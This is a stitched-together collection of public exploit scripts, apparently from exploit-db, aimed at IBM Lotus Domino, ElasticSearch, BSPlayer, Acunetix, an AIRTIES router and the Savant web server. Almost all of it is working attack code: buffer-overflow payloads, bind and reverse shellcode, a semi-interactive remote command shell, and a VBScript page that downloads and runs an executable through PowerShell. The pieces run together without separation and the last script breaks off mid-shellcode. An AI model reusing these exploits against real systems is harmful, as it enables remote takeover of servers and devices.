# www.metasploit.com * UE-Team & I-BackTrack * r00tw0rm.com * All Security and Exploits Webs ..
#=================================================source: http://www.securityfocus.com/bid/49705/info

IBM Lotus Domino is prone to a remote stack-based buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied input.

Successfully exploiting this issue will allow remote attackers to execute arbitrary code with system-level privileges. Successful exploits will completely compromise affected computers. Failed exploit attempts will result in a denial-of-service condition.

Lotus Domino 8.5.2 is vulnerable; other versions may also be affected. 

#!/usr/bin/python

import socket,struct,sys,os

host="192.168.x.y"					#server ip here!
cookie="1234567890abcdef"	                        #Set your Cookie credential here! Cookie = base64((usr:pwd))
#Shellcode = Using XOR [reg],reg to crash ("like" INT3 :))
Shellcode=chr(0x30)

server=host,80
SEH=struct.pack("<L",0x60404672)                       # POP ESI - POP EBP - RETN nnotes.dll.60404672
nSEH=struct.pack("<L",0x4141347A)                      # INC ecx  ;NOP 
                                                        # INC ecx  ;NOP
 							# JPE  slep ;Detour
vars="__Click=0&tHPRAgentName="                         #tHPRAgentName => Vulnerable POST variable
buf="A"*436                                             #sended buffer-nSEH-SEH
slep="X"*46                                             #pre-shellcode to fix JPE landing

#This function forges our POST request (with our Shellcode sure)
def buildPOST(h,b,c):				
	P="POST /webadmin.nsf/fmHttpPostRequest?OpenForm&Seq=1 HTTP/1.1\r\n"
	P+="Host: "+h+"\r\n"
	P+="User-Agent: oh sure\r\n"
	P+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	P+="Accept-Language: chinnese plz\r\n"
	P+="Accept-Encoding: gzip,deflate\r\n"
	P+="Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
	P+="Keep-Alive: 115\r\n"
	P+="Connection: keep-alive\r\n"
	P+="Referer:  http://"+h+"/webadmin.nsf/dlgConfigPorts?ReadForm&objref=16\r\n"
	P+="Cookie: CWCweb=\"savedLocale:en\"\r\n"
	P+="Authorization: Basic "+c+"\r\n"
	P+="Content-Type: application/x-www-form-urlencoded\r\n"
	P+="Content-Length: %s\r\n" % str(len(b))
	P+="\r\n"
	P+=b
	return P

def main():
	if os.name=="nt":
		os.system("cls")
	else:
		os.system("clear")
	print"\t->[ IBM Lotus Domino 8.5.2 Remote Stack Overflow ]<-"
	print"\t        ->[Remote Code Execution Exploit]<-\n\n"
	print"[+] Crafting buffer..."
	#Creating POST content data
	buffer=vars+buf+nSEH+SEH+slep+Shellcode
	print"[+] Connecting to server..."
	s=socket.socket()
	#Trying connect to IBM Lotus Domino HTTP server
	try:
		s.connect(server)
	#We goin to exit if this fails
	except:
		print"[-] Error connecting to remote server..."
		sys.exit(0)
	print"[+] Crafting POST request..."
	#Crafting final POST
	post=buildPOST(host,buffer,cookie)
	print"[+] 0k, sending..."
	#Sending Shellcode to remote server
	s.send(post)
	#Server is running? Some fails :S
	try:
		print s.recv(2048)
		print"[x] Exploit failed!"
	#Else we achieve remote code execution successfully
	except:
		print"[+] Done!" 
	s.close()
	print"\n[*] By @rmallof"

if __name__=="__main__":
	main()
#!/usr/bin/python
#
# IBM Lotus Domino Server 6.5 PRE AUTH Remote Exploit
# Tested on windows 2003 server SP0. 
# Coded by Mati Aharoni
# muts@offensive-security.com
# http://www.offensive-security.com
# Notes:
# * Not the the faint of heart.
# * Iris, I love you
# Skeleton exploit shamelessly ripped off Winny Thomas
#
# bt ~ # ./domino 192.168.0.38
# [*] IBM Lotus Domino Server 6.5 Remote Exploit
# [*] muts {-at-} offensive-security.com
#
# [*] Sending bindshell *somewhere* into memory
# [*] Sending bindshell *somewhere* into memory
# [*] Sending bindshell *somewhere* into memory
# [*] Sending bindshell *somewhere* into memory
# * OK Domino IMAP4 Server Release 6.5 ready Sat, 31 Mar 2007 01:45:32 -0800
#
# + PDAwMzU5QjhGLjg4MjU3MkFGLjAwMDAwQkMwLjAwMDAwMDA4QFRFU1QuQ09NPg==
#
# [*] Triggering overwrite, ph33r.
# [*] You may need to wait up to 2 minutes
# [*] for egghunter to find da shell.
# bt ~ # date
# Sat Mar 31 11:47:07 GMT 2007
# bt ~ # nc -v 192.168.0.38 4444
# 192.168.0.38: inverse host lookup failed: Unknown host
# (UNKNOWN) [192.168.0.38] 4444 (krb524) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
#C:\Lotus\Domino>


import sys
import md5
import struct
import base64
import socket

def sendbind(target):
	bindshell ="\x90"* 400  # Metasploit bind shell port 4444
	bindshell +="\x54\x30\x30\x57\x54\x30\x30\x57" 
	bindshell +=("\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
	"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
	"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
	"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
	"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
 	"\x4f\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x58"
	"\x4e\x56\x46\x32\x46\x32\x4b\x38\x45\x44\x4e\x43\x4b\x58\x4e\x47"
	"\x45\x50\x4a\x57\x41\x50\x4f\x4e\x4b\x38\x4f\x34\x4a\x41\x4b\x58"
	"\x4f\x55\x42\x52\x41\x30\x4b\x4e\x43\x4e\x42\x53\x49\x54\x4b\x38"
	"\x46\x53\x4b\x58\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a"
	"\x46\x58\x42\x4c\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x30"
	"\x44\x4c\x4b\x4e\x46\x4f\x4b\x33\x46\x55\x46\x42\x4a\x42\x45\x57"
	"\x43\x4e\x4b\x58\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x58"
	"\x4e\x50\x4b\x34\x4b\x48\x4f\x55\x4e\x41\x41\x30\x4b\x4e\x43\x30"
	"\x4e\x52\x4b\x48\x49\x38\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c"
	"\x41\x43\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x33\x4b\x58\x42\x44"
	"\x4e\x50\x4b\x38\x42\x47\x4e\x41\x4d\x4a\x4b\x48\x42\x54\x4a\x50"
	"\x50\x35\x4a\x46\x50\x58\x50\x44\x50\x50\x4e\x4e\x42\x35\x4f\x4f"
	"\x48\x4d\x41\x53\x4b\x4d\x48\x36\x43\x55\x48\x56\x4a\x36\x43\x33"
	"\x44\x33\x4a\x56\x47\x47\x43\x47\x44\x33\x4f\x55\x46\x55\x4f\x4f"
	"\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e\x4e\x4f\x4b\x53\x42\x45\x4f\x4f"
	"\x48\x4d\x4f\x35\x49\x48\x45\x4e\x48\x56\x41\x48\x4d\x4e\x4a\x50"
	"\x44\x30\x45\x55\x4c\x46\x44\x50\x4f\x4f\x42\x4d\x4a\x36\x49\x4d"
	"\x49\x50\x45\x4f\x4d\x4a\x47\x55\x4f\x4f\x48\x4d\x43\x45\x43\x45"
	"\x43\x55\x43\x55\x43\x45\x43\x34\x43\x45\x43\x34\x43\x35\x4f\x4f"
	"\x42\x4d\x48\x56\x4a\x56\x41\x41\x4e\x35\x48\x36\x43\x35\x49\x38"
	"\x41\x4e\x45\x49\x4a\x46\x46\x4a\x4c\x51\x42\x57\x47\x4c\x47\x55"
	"\x4f\x4f\x48\x4d\x4c\x36\x42\x31\x41\x45\x45\x35\x4f\x4f\x42\x4d"
	"\x4a\x36\x46\x4a\x4d\x4a\x50\x42\x49\x4e\x47\x55\x4f\x4f\x48\x4d"
	"\x43\x35\x45\x35\x4f\x4f\x42\x4d\x4a\x36\x45\x4e\x49\x44\x48\x38"
	"\x49\x54\x47\x55\x4f\x4f\x48\x4d\x42\x55\x46\x35\x46\x45\x45\x35"
	"\x4f\x4f\x42\x4d\x43\x49\x4a\x56\x47\x4e\x49\x37\x48\x4c\x49\x37"
	"\x47\x45\x4f\x4f\x48\x4d\x45\x55\x4f\x4f\x42\x4d\x48\x36\x4c\x56"
	"\x46\x46\x48\x36\x4a\x46\x43\x56\x4d\x56\x49\x38\x45\x4e\x4c\x56"
	"\x42\x55\x49\x55\x49\x52\x4e\x4c\x49\x48\x47\x4e\x4c\x36\x46\x54"
	"\x49\x58\x44\x4e\x41\x43\x42\x4c\x43\x4f\x4c\x4a\x50\x4f\x44\x54"
	"\x4d\x32\x50\x4f\x44\x54\x4e\x52\x43\x49\x4d\x58\x4c\x47\x4a\x53"
	"\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x46\x44\x57\x50\x4f\x43\x4b\x48\x51"
	"\x4f\x4f\x45\x57\x46\x54\x4f\x4f\x48\x4d\x4b\x45\x47\x35\x44\x35"
	"\x41\x35\x41\x55\x41\x35\x4c\x46\x41\x50\x41\x35\x41\x45\x45\x35"
	"\x41\x45\x4f\x4f\x42\x4d\x4a\x56\x4d\x4a\x49\x4d\x45\x30\x50\x4c"
	"\x43\x35\x4f\x4f\x48\x4d\x4c\x56\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f"
	"\x42\x4d\x4b\x58\x47\x45\x4e\x4f\x43\x38\x46\x4c\x46\x36\x4f\x4f"
	"\x48\x4d\x44\x55\x4f\x4f\x42\x4d\x4a\x36\x4f\x4e\x50\x4c\x42\x4e"
	"\x42\x36\x43\x55\x4f\x4f\x48\x4d\x4f\x4f\x42\x4d\x5a")

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((target, 143))
	response = sock.recv(1024)
	bind = 'a001 admin ' + bindshell +'\r\n'
	print "[*] Sending bindshell *somewhere* into memory"
	sock.send(bind)
	response = sock.recv(1024)
	sock.close()

def ExploitLotus(target):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((target, 143))
	response = sock.recv(1024)
	print response
	auth = 'a001 authenticate cram-md5\r\n'
	sock.send(auth)
	response = sock.recv(1024)
	print response
	m = md5.new()
	m.update(response[2:0])
	digest = m.digest()
	payload = "\x90" * 12 + "\x33\xd2\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" + 'A' * 210

	# 0x774b4c6a CALL [EAX +4]

	payload += "jLKw"
	payload += "\x90\x90\x90\x83\xE8\x52\x83\xE8\x52\x83\xE8\x52\xFF\xE0"
	login = payload + ' ' + digest
	login = base64.encodestring(login) + '\r\n'
	print "[*] Triggering overwrite, ph33r."
	sock.send(login)
	sock.close()
	print "[*] You may need to wait up to 2 minutes"
	print "[*] for egghunter to find da shell."

if __name__=="__main__":
	try:
		target = sys.argv[1]
	except IndexError:
		print '[*] IBM Lotus Domino Server 6.5 Remote Exploit \n[*] muts {-at-} offensive-security.com\r\n'
		print '[*] Usage: %s <imap server>\n' % sys.argv[0]
		
		sys.exit(-1)
	
	print '[*] IBM Lotus Domino Server 6.5 Remote Exploit \n[*] muts {-at-} offensive-security.com\r\n'
	sendbind(target)
	sendbind(target)
	sendbind(target)
	sendbind(target)
	ExploitLotus(target)

# milw0rm.com [2007-03-31]
#!/bin/python2
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Version: 20150309.1
# Licence: WTFPL - wtfpl.net
import json
import requests
import sys
import readline
readline.parse_and_bind('tab: complete')
readline.parse_and_bind('set editing-mode vi')
__version__ = "20150309.1"

def banner():
    print """\x1b[1;32m
▓█████  ██▓    ▄▄▄        ██████ ▄▄▄█████▓ ██▓ ▄████▄    ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓█   ▀ ▓██▒   ▒████▄    ▒██    ▒ ▓  ██▒ ▓▒▓██▒▒██▀ ▀█  ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒███   ▒██░   ▒██  ▀█▄  ░ ▓██▄   ▒ ▓██░ ▒░▒██▒▒▓█    ▄ ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒▓█  ▄ ▒██░   ░██▄▄▄▄██   ▒   ██▒░ ▓██▓ ░ ░██░▒▓▓▄ ▄██▒  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▒████▒░██████▒▓█   ▓██▒▒██████▒▒  ▒██▒ ░ ░██░▒ ▓███▀ ░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ▒ ░░   ░▓  ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░░ ░▒  ░ ░    ░     ▒ ░  ░  ▒   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
   ░     ░ ░    ░   ▒   ░  ░  ░    ░       ▒ ░░        ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
   ░  ░    ░  ░     ░  ░      ░            ░  ░ ░            ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
                                              ░                                                
 Exploit for ElasticSearch , CVE-2015-1427   Version: %s\x1b[0m""" %(__version__)

def execute_command(target, command):
    payload = """{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}""" %(command)
    try:
        url = "http://%s:9200/_search?pretty" %(target)
        r = requests.post(url=url, data=payload)
    except Exception, e:
        sys.exit("Exception Hit"+str(e))
    values = json.loads(r.text)
    fuckingjson = values['hits']['hits'][0]['fields']['lupin'][0]
    print fuckingjson.strip()
        

def exploit(target):
    print "{*} Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something"
    while True:
        cmd = raw_input("~$ ")
        if cmd == "exit":
            sys.exit("{!} Shell exiting!")
        else:
            execute_command(target=target, command=cmd)
    
def main(args):
    banner()
    if len(args) != 2:
        sys.exit("Use: %s target" %(args[0]))
    exploit(target=args[1])

if __name__ == "__main__":
	main(args=sys.argv)#!/usr/bin/python

''' Bsplayer suffers from a buffer overflow vulnerability when processing the HTTP response when opening a URL.
In order to exploit this bug I partially overwrited the seh record to land at pop pop ret instead of the full
address and then used backward jumping to jump to a long jump that eventually land in my shellcode.

Tested on : windows xp sp1 - windows 7 sp1 - Windows 8 Enterprise it might work in other versions as well just give it a try :)

My twitter: @fady_osman
My youtube: https://www.youtube.com/user/cutehack3r
'''

import socket
import sys
s = socket.socket()         # Create a socket object
if(len(sys.argv) < 3):
  print "[x] Please enter an IP and port to listen to."
  print "[x] " + sys.argv[0] + " ip port"
  exit()
host = sys.argv[1]	    # Ip to listen to.
port = int(sys.argv[2])     # Reserve a port for your service.
s.bind((host, port))        # Bind to the port
print "[*] Listening on port " + str(port)
s.listen(5)                 # Now wait for client connection.
c, addr = s.accept()        # Establish connection with client.
# Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
print(('[*] Sending the payload first time', addr))
c.recv(1024)
#seh and nseh.
buf =  ""
buf += "\xbb\xe4\xf3\xb8\x70\xda\xc0\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x33\x31\x58\x12\x83\xc0\x04\x03\xbc\xfd\x5a"
buf += "\x85\xc0\xea\x12\x66\x38\xeb\x44\xee\xdd\xda\x56\x94"
buf += "\x96\x4f\x67\xde\xfa\x63\x0c\xb2\xee\xf0\x60\x1b\x01"
buf += "\xb0\xcf\x7d\x2c\x41\xfe\x41\xe2\x81\x60\x3e\xf8\xd5"
buf += "\x42\x7f\x33\x28\x82\xb8\x29\xc3\xd6\x11\x26\x76\xc7"
buf += "\x16\x7a\x4b\xe6\xf8\xf1\xf3\x90\x7d\xc5\x80\x2a\x7f"
buf += "\x15\x38\x20\x37\x8d\x32\x6e\xe8\xac\x97\x6c\xd4\xe7"
buf += "\x9c\x47\xae\xf6\x74\x96\x4f\xc9\xb8\x75\x6e\xe6\x34"
buf += "\x87\xb6\xc0\xa6\xf2\xcc\x33\x5a\x05\x17\x4e\x80\x80"
buf += "\x8a\xe8\x43\x32\x6f\x09\x87\xa5\xe4\x05\x6c\xa1\xa3"
buf += "\x09\x73\x66\xd8\x35\xf8\x89\x0f\xbc\xba\xad\x8b\xe5"
buf += "\x19\xcf\x8a\x43\xcf\xf0\xcd\x2b\xb0\x54\x85\xd9\xa5"
buf += "\xef\xc4\xb7\x38\x7d\x73\xfe\x3b\x7d\x7c\x50\x54\x4c"
buf += "\xf7\x3f\x23\x51\xd2\x04\xdb\x1b\x7f\x2c\x74\xc2\x15"
buf += "\x6d\x19\xf5\xc3\xb1\x24\x76\xe6\x49\xd3\x66\x83\x4c"
buf += "\x9f\x20\x7f\x3c\xb0\xc4\x7f\x93\xb1\xcc\xe3\x72\x22"
buf += "\x8c\xcd\x11\xc2\x37\x12"

jmplong = "\xe9\x85\xe9\xff\xff"
nseh = "\xeb\xf9\x90\x90"
# Partially overwriting the seh record (nulls are ignored).
seh = "\x3b\x58\x00\x00"
buflen = len(buf)
response = "\x90" *2048 + buf + "\xcc" * (6787 - 2048 - buflen) + jmplong + nseh + seh #+ "\xcc" * 7000
c.send(response)
c.close()
c, addr = s.accept()        # Establish connection with client.
# Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
print(('[*] Sending the payload second time', addr))
c.recv(1024)
c.send(response)
c.close()
s.close()
#!/usr/bin/python

import BaseHTTPServer, sys, socket

##
# Acunetix OLE Automation Array Remote Code Execution
#
# Author: Naser Farhadi
# Linkedin: http://ir.linkedin.com/pub/naser-farhadi/85/b3b/909
#
# Date: 27 Mar 2015 # Version: <=9.5 # Tested on: Windows 7
# Description: Acunetix Login Sequence Recorder (lsr.exe) Uses CoCreateInstance API From Ole32.dll To Record 
# Target Login Sequence
# Exploit Based on MS14-064 CVE2014-6332 http://www.exploit-db.com/exploits/35229/
# This Python Script Will Start A Sample HTTP Server On Your Machine And Serves Exploit Code And
# Metasploit windows/shell_bind_tcp Executable Payload
# And Finally You Can Connect To Victim Machine Using Netcat    
# Usage:
#       chmod +x acunetix.py
#       ./acunetix.py
#       Attacker Try To Record Login Sequence Of Your Http Server Via Acunetix
#       nc 192.168.1.7 333
# Payload Generated By This Command:    msfpayload windows/shell_bind_tcp LPORT=333 X > acunetix.exe
# 
# Video: https://vid.me/SRCb
##

class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(req):
        req.send_response(200)
        if req.path == "/acunetix.exe":
            req.send_header('Content-type', 'application/exe')
            req.end_headers()
            exe = open("acunetix.exe", 'rb')
            req.wfile.write(exe.read())
            exe.close()
        else:
            req.send_header('Content-type', 'text/html')
            req.end_headers()
            req.wfile.write("""Please scan me!
                            <SCRIPT LANGUAGE="VBScript">
                            function runmumaa() 
                            On Error Resume Next
                            set shell=createobject("Shell.Application")
                            command="Invoke-Expression $(New-Object System.Net.WebClient).DownloadFile('http://"""+socket.gethostbyname(socket.gethostname())+"""/acunetix.exe',\
                            'acunetix.exe');$(New-Object -com Shell.Application).ShellExecute('acunetix.exe');"
                            shell.ShellExecute "powershell", "-Command " & command, "", "runas", 0
                            end function

                            dim   aa()
                            dim   ab()
                            dim   a0
                            dim   a1
                            dim   a2
                            dim   a3
                            dim   win9x
                            dim   intVersion
                            dim   rnda
                            dim   funclass
                            dim   myarray

                            Begin()

                            function Begin()
                              On Error Resume Next
                              info=Navigator.UserAgent

                              if(instr(info,"Win64")>0)   then
                                 exit   function
                              end if

                              if (instr(info,"MSIE")>0)   then 
                                         intVersion = CInt(Mid(info, InStr(info, "MSIE") + 5, 2))   
                              else
                                 exit   function  
                                         
                              end if

                              win9x=0

                              BeginInit()
                              If Create()=True Then
                                 myarray=        chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
                                 myarray=myarray&chrw(00)&chrw(32767)&chrw(00)&chrw(0)

                                 if(intVersion<4) then
                                     document.write("<br> IE")
                                     document.write(intVersion)
                                     runshellcode()                    
                                 else  
                                      setnotsafemode()
                                 end if
                              end if
                            end function

                            function BeginInit()
                               Randomize()
                               redim aa(5)
                               redim ab(5)
                               a0=13+17*rnd(6)
                               a3=7+3*rnd(5)
                            end function

                            function Create()
                              On Error Resume Next
                              dim i
                              Create=False
                              For i = 0 To 400
                                If Over()=True Then
                                '   document.write(i)     
                                   Create=True
                                   Exit For
                                End If 
                              Next
                            end function

                            sub testaa()
                            end sub

                            function mydata()
                                On Error Resume Next
                                 i=testaa
                                 i=null
                                 redim  Preserve aa(a2)  
                              
                                 ab(0)=0
                                 aa(a1)=i
                                 ab(0)=6.36598737437801E-314

                                 aa(a1+2)=myarray
                                 ab(2)=1.74088534731324E-310  
                                 mydata=aa(a1)
                                 redim  Preserve aa(a0)  
                            end function 


                            function setnotsafemode()
                                On Error Resume Next
                                i=mydata()  
                                i=readmemo(i+8)
                                i=readmemo(i+16)
                                j=readmemo(i+&h134)  
                                for k=0 to &h60 step 4
                                    j=readmemo(i+&h120+k)
                                    if(j=14) then
                                          j=0          
                                          redim  Preserve aa(a2)             
                                 aa(a1+2)(i+&h11c+k)=ab(4)
                                          redim  Preserve aa(a0)  

                                 j=0 
                                          j=readmemo(i+&h120+k)   
                                     
                                           Exit for
                                       end if

                                next 
                                ab(2)=1.69759663316747E-313
                                runmumaa() 
                            end function

                            function Over()
                                On Error Resume Next
                                dim type1,type2,type3
                                Over=False
                                a0=a0+a3
                                a1=a0+2
                                a2=a0+&h8000000
                              
                                redim  Preserve aa(a0) 
                                redim   ab(a0)     
                              
                                redim  Preserve aa(a2)
                              
                                type1=1
                                ab(0)=1.123456789012345678901234567890
                                aa(a0)=10
                                      
                                If(IsObject(aa(a1-1)) = False) Then
                                   if(intVersion<4) then
                                       mem=cint(a0+1)*16             
                                       j=vartype(aa(a1-1))
                                       if((j=mem+4) or (j*8=mem+8)) then
                                          if(vartype(aa(a1-1))<>0)  Then    
                                             If(IsObject(aa(a1)) = False ) Then             
                                               type1=VarType(aa(a1))
                                             end if               
                                          end if
                                       else
                                         redim  Preserve aa(a0)
                                         exit  function

                                       end if 
                                    else
                                       if(vartype(aa(a1-1))<>0)  Then    
                                          If(IsObject(aa(a1)) = False ) Then
                                              type1=VarType(aa(a1))
                                          end if               
                                        end if
                                    end if
                                end if
                                          
                                
                                If(type1=&h2f66) Then         
                                      Over=True      
                                End If  
                                If(type1=&hB9AD) Then
                                      Over=True
                                      win9x=1
                                End If  

                                redim  Preserve aa(a0)          
                                    
                            end function

                            function ReadMemo(add) 
                                On Error Resume Next
                                redim  Preserve aa(a2)  
                              
                                ab(0)=0   
                                aa(a1)=add+4     
                                ab(0)=1.69759663316747E-313       
                                ReadMemo=lenb(aa(a1))  
                               
                                ab(0)=0    
                             
                                redim  Preserve aa(a0)
                            end function

                            </script>""")

if __name__ == '__main__':
    sclass = BaseHTTPServer.HTTPServer
    server = sclass((socket.gethostbyname(socket.gethostname()), 80), RequestHandler)
    print "Http server started", socket.gethostbyname(socket.gethostname()), 80
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    server.server_close()#!/usr/bin/env python
#####################################################################################
# Exploit for the AIRTIES Air5650v3TT 
# Spawns a reverse root shell
# Author: Batuhan Burakcin
# Contact: batuhan@bmicrosystems.com
# Twitter: @batuhanburakcin
# Web: http://www.bmicrosystems.com
#####################################################################################

import sys
import time
import string
import socket, struct
import urllib, urllib2, httplib





if __name__ == '__main__':
	



	try:
		ip = sys.argv[1]
		revhost = sys.argv[2]
		revport = sys.argv[3]
	except:
		print "Usage: %s <target ip> <reverse shell ip> <reverse shell port>" % sys.argv[0]

	host = struct.unpack('>L',socket.inet_aton(revhost))[0]	
	port = string.atoi(revport)


	shellcode = ""
	shellcode += "\x24\x0f\xff\xfa\x01\xe0\x78\x27\x21\xe4\xff\xfd\x21\xe5\xff\xfd"
	shellcode += "\x28\x06\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff"
	shellcode += "\x8f\xa4\xff\xff\x34\x0f\xff\xfd\x01\xe0\x78\x27\xaf\xaf\xff\xe0"
	shellcode += "\x3c\x0e" + struct.unpack('>cc',struct.pack('>H', port))[0] + struct.unpack('>cc',struct.pack('>H', port))[1]
	shellcode += "\x35\xce" + struct.unpack('>cc',struct.pack('>H', port))[0] + struct.unpack('>cc',struct.pack('>H', port))[1]
	shellcode += "\xaf\xae\xff\xe4"
	shellcode += "\x3c\x0e" + struct.unpack('>cccc',struct.pack('>I', host))[0] + struct.unpack('>cccc',struct.pack('>I', host))[1]
	shellcode += "\x35\xce" + struct.unpack('>cccc',struct.pack('>I', host))[2] + struct.unpack('>cccc',struct.pack('>I', host))[3]
	shellcode += "\xaf\xae\xff\xe6\x27\xa5\xff\xe2\x24\x0c\xff\xef\x01\x80\x30\x27"
	shellcode += "\x24\x02\x10\x4a\x01\x01\x01\x0c\x24\x11\xff\xfd\x02\x20\x88\x27"
	shellcode += "\x8f\xa4\xff\xff\x02\x20\x28\x21\x24\x02\x0f\xdf\x01\x01\x01\x0c"
	shellcode += "\x24\x10\xff\xff\x22\x31\xff\xff\x16\x30\xff\xfa\x28\x06\xff\xff"
	shellcode += "\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f"
	shellcode += "\x35\xce\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff\xec"
	shellcode += "\xaf\xa4\xff\xf8\xaf\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab"
	shellcode += "\x01\x01\x01\x0c"


	data = "\x41"*359 + "\x2A\xB1\x19\x18" + "\x41"*40 + "\x2A\xB1\x44\x40" 
	data += "\x41"*12 + "\x2A\xB0\xFC\xD4" + "\x41"*16 + "\x2A\xB0\x7A\x2C" 
	data += "\x41"*28 + "\x2A\xB0\x30\xDC" + "\x41"*240 + shellcode + "\x27\xE0\xFF\xFF"*48

	pdata = {
		'redirect'		: data,
		'self'			: '1',
		'user'			: 'tanri',
		'password'		: 'ihtiyacmyok',
		'gonder'		: 'TAMAM'
		}

	login_data = urllib.urlencode(pdata)
	#print login_data

	url = 'http://%s/cgi-bin/login' % ip
	header = {}
	req = urllib2.Request(url, login_data, header)
	rsp = urllib2.urlopen(req)




source: http://www.securityfocus.com/bid/51607/info

Savant web server is prone to a buffer-overflow vulnerability.

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

Savant web server 3.1 is vulnerable; other versions may also be affected.

#!/usr/bin/python
import socket
 
target_address="10.10.10.129"
target_port=80
 
buffer2 = "R0cX" + "R0cX"
# msfpayload windows/shell_bind_tcp LPORT=4444 R | msfencode -e x86/shikata_ga_nai -c 4 -t c
buffer2 += ("\xbd\xec\x37\x93\x4b\xdb\xcf\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x6a\x83\xc0\x04\x31\x68\x10\x03\x68\x10\x0e\xc2\x4a\xa1\x17"
"\x59\x49\xc2\xff\x91\x58\x90\x5d\x29\xec\xb0\x10\xb1\x92\xd3"
"\xae\x07\xc5\x35\x4d\x38\xf3\xdb\x06\xfc\xec\x5f\xa5\x66\x93"
"\xcc\x5d\x07\x81\xcb\xcc\x59\x35\x45\xd6\x2d\x15\xa1\xe7\xbb"
"\xd6\x5d\x68\x57\x1b\x2a\x4f\xe8\xdd\xd3\xc0\x84\x0c\x0e\xb7"
"\x03\x24\xc7\xfd\xd2\xa5\x88\x89\xf8\x07\x82\x1b\xcb\x2d\x3b"
"\xfd\x9d\x67\xa9\xff\xe9\x20\x9e\xa9\x25\x8b\x7c\xda\xd9\x01"
"\x32\x51\x36\x9a\xe7\x73\x8f\xe5\xea\x60\xa6\x4c\x78\xef\xbb"
"\x1e\x37\xd0\xbd\xaa\x4f\xe7\x94\x3e\x02\x34\x21\xc6\xc1\xe2"
"\xa3\x6f\x76\x92\x9a\xed\xda\x19\x2d\xca\x21\xb2\xb0\xa9\xb5"
"\x72\xa1\xbb\xd0\x18\x64\xd3\xb4\x85\x0c\x92\xf7\x07\xcf\x13"
"\xc2\x95\x57\x0a\x68\x6d\x94\x6f\x5a\xad\xd1\x82\x26\x9f\x3c"
"\x0d\x2b\xdc\x06\x6a\xd3\x87\x24\x9c\x14\x58\x71\x42\xef\x1b"
"\x90\xdc\x46\x67\x51\xd3\x4c\xc4\x11\x23\x29\xbd\xc5\xab\x96"
"\x54\x5e\xb6\x08\x60\x42\x5f\x7a\x76\xdf\x30\x05\x76\xb7\xd1"
"\xf2\x49\xba\x14\x69\xa7\x7b\xa8\x6b\xb9\xad\xc8\x8e\x0f\x9e"
"\x07\x7f\xa7\x89\x9b\x4d\x68\xbd\x45\x77\xe0\x64\xec\xa2\x18"
"\x2d\x6f\x10\xc3\x14\x1d\x4e\x92\x3a\x8a\xf0\xd8\x07\x12\x19"
"\x27\x0c\x23\xe4\x0b\xbb\x6d\x97\xf8\xe8\x8c\x23\xb5\xe0\x22"
"\xe8\x70\x85\x10\xbb\x64\xbe\x09\x41\xe7\x2d\x6d\x39\xfb\xcc"
"\x09\xee\xca\x8f\x83\x22\x5d\x77\x2b\x5b\xc6\x1b\x82\x6e\x17"
